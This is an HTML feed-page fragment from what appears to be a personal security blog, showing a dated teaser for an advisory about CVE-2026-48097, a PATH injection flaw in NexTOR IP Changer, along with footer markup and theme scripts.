href="https://w4nn4d13.github.io/authors/w4nn4d13/" class="feed__author">w4nn4d13</a> <time datetime="2026-06-13T15:33" class="feed__date">June 13, 2026</time></div><h3 class="feed__title"><a href="https://w4nn4d13.github.io/cve-2026-48097-path-injection-leading-to-arbitrary-command-execution-in-nextor-ip-changer.html">CVE-2026-48097 PATH Injection Leading to Arbitrary Command Execution in NexTOR IP Changer</a></h3></header><p>Overview CVE-2026-48097 is a high-severity vulnerability affecting NexTOR IP Changer. The issue originated from unsafe command execution practices that relied on executable resolution through the system PATH environment variable. Under specific conditions, an attacker capable of influencing the execution environment could cause the application to&hellip;</p><a href="https://w4nn4d13.github.io/cve-2026-48097-path-injection-leading-to-arbitrary-command-execution-in-nextor-ip-changer.html" class="readmore feed__readmore">Continue reading...</a></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><p>Powered by w4nn4d13</p></div><div class="footer__social"><a href="https://x.com/0x5t4l1n" aria-label="X"><svg><use xlink:href="https://w4nn4d13.github.io/assets/svg/svg-map.svg#twitter"/></svg> </a><a href="https://www.linkedin.com/in/stalin-s-a310882a0/" aria-label="LinkedIn"><svg><use xlink:href="https://w4nn4d13.github.io/assets/svg/svg-map.svg#linkedin"/></svg></a></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://w4nn4d13.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://w4nn4d13.github.io/assets/js/scripts.min.js?v=dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script></body></html>
